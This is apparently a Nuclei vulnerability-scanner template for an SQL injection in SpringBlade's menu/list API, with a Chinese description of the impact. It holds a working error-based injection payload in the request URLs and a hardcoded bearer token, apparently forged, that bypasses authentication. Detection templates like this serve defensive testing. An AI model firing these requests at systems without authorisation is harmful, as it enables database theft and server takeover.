id: SpringBlade-menu-sqli

info:
  name: Template Name
  author: wangzong
  severity: high
  description: SpringBlade 后台框架 menu/list 存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference:
    - https://github.com/wy876/POC/blob/main/SpringBlade%E7%B3%BB%E7%BB%9Fmenu%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  tags: tags

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/blade-system/menu/list?updatexml(1,concat(0x7e,md5(1),0x7e),1)=1"
      - "{{BaseURL}}/api/blade-system/menu/menu-list?updatexml(1,concat(0x7e,md5(1),0x7e),1)=1"

    headers:
      Blade-Auth: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..RtS67Tmbo7yFKHyMz_bMQW7dfgNjxZW47KtnFcwItxQ

    matchers:
      - type: word
        part: body
        words:
          - 'c4ca4238'
